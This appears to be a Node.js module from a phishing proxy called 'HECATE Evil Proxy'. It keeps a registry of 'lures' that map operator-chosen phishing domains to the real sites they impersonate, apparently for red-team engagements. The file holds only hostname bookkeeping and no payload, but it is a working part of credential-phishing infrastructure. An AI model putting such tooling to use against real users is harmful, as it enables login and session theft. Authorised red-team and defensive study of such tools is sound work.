'use strict';

/**
 * HECATE Evil Proxy — Phishlet Store
 * In-memory registry of active phishlets.
 * Maps phishing hostnames → phishlet + origin hostname.
 *
 * A "lure" is a phishlet instance configured for a specific phishing domain.
 * Multiple lures can reference the same phishlet definition.
 */

const loader = require('./loader');

// Map<lureId, Lure>
const lures = new Map();

// Map<phishingHostname, lureId> — fast lookup in proxy handler
const hostIndex = new Map();

let _lureSeq = 0;

/**
 * @typedef {object} Lure
 * @property {string}   id
 * @property {string}   engagementId
 * @property {string}   phishletName
 * @property {string}   phishDomain    - operator's phishing domain (e.g. login-secure.com)
 * @property {object}   phishlet       - normalised phishlet
 * @property {boolean}  active
 * @property {string}   createdAt
 * @property {Map}      hostMap        - phish hostname → origin hostname
 * @property {Map}      reverseMap     - origin hostname → phish hostname
 */

/**
 * Register a new lure.
 * @param {object} opts
 * @param {string} opts.engagementId
 * @param {string} opts.phishletName
 * @param {string} opts.phishDomain    - the operator's phishing TLD (e.g. 'secure-login.io')
 * @param {object} opts.phishletOverride - optional raw phishlet to use instead of loading by name
 * @returns {string} lureId
 */
function addLure({ engagementId, phishletName, phishDomain, phishletOverride }) {
  if (!phishDomain) throw new Error('phishDomain required');

  const phishlet = phishletOverride
    ? loader.loadObject(phishletOverride)
    : loader.load(phishletName);

  const id = `lure-${++_lureSeq}`;

  // Build hostname maps for this lure
  const hostMap    = new Map();
  const reverseMap = new Map();

  for (const h of phishlet.proxyHosts) {
    const origHost  = h.origSub  ? `${h.origSub}.${h.domain}`  : h.domain;
    const phishHost = h.phishSub ? `${h.phishSub}.${phishDomain}` : phishDomain;

    hostMap.set(phishHost, origHost);
    reverseMap.set(origHost, phishHost);

    // Register in global host index
    hostIndex.set(phishHost, id);
  }

  const lure = {
    id,
    engagementId,
    phishletName:  phishlet.name,
    phishDomain,
    phishlet,
    active:     true,
    createdAt:  new Date().toISOString(),
    hostMap,
    reverseMap,
  };

  lures.set(id, lure);
  return id;
}

function getLure(lureId) {
  return lures.get(lureId) ?? null;
}

function getLureByHost(hostname) {
  const id = hostIndex.get(hostname);
  return id ? lures.get(id) ?? null : null;
}

function listLures(engagementId) {
  const all = [...lures.values()];
  return engagementId ? all.filter(l => l.engagementId === engagementId) : all;
}

function disableLure(lureId) {
  const lure = lures.get(lureId);
  if (!lure) return false;
  lure.active = false;
  // Remove from host index so proxy stops handling it
  for (const [host, id] of hostIndex) {
    if (id === lureId) hostIndex.delete(host);
  }
  return true;
}

function removeLure(lureId) {
  disableLure(lureId);
  lures.delete(lureId);
}

function clear() {
  lures.clear();
  hostIndex.clear();
}

module.exports = {
  addLure, getLure, getLureByHost,
  listLures, disableLure, removeLure, clear,
};
